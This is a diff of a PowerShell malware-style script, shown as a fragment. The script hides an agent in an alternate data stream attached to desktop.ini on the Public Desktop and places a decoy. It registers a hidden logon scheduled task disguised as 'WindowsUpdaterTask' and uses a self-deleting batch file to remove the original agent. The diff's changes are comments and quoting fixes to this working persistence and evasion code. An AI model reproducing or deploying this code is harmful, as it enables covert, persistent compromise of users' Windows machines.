@@ -13,6 +13,7 @@ $publicDesktop = "C:\Users\Public\Desktop"
 $carrierFile = "$publicDesktop\desktop.ini"
 $streamName = "thumbs.db"
 
+# Ensure carrier file exists
 if (-not (Test-Path $carrierFile)) {
     @"
 [.ShellClassInfo]
@@ -50,7 +51,9 @@ Write-Output "[+] Decoy created (does nothing when run)."
 $taskName = "WindowsUpdaterTask"
 $execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
 
+# Delete existing task if any
 schtasks /delete /tn $taskName /f 2>$null
+# Create new task
 schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
 if ($LASTEXITCODE -eq 0) {
     Write-Output "[+] Scheduled task '$taskName' created. Agent will run at next logon."
@@ -68,12 +71,12 @@ try {
 } catch {
     Write-Output "[-] Original agent still exists – scheduling deletion on next reboot."
 
-    # Create a simple batch file using an array of strings (no here‑string issues)
+    # Create a simple batch file using an array of strings (safe, no here‑string issues)
     $tempScript = "$env:TEMP\del_agent.bat"
     $batchLines = @(
-        "@echo off",
+        '@echo off',
         "del /f /q `"$agentPath`"",
-        "del /f /q `"%~f0`""
+        'del /f /q "%~f0"'
     )
     $batchLines -join "`r`n" | Set-Content -Path $tempScript -Encoding ASCII
 
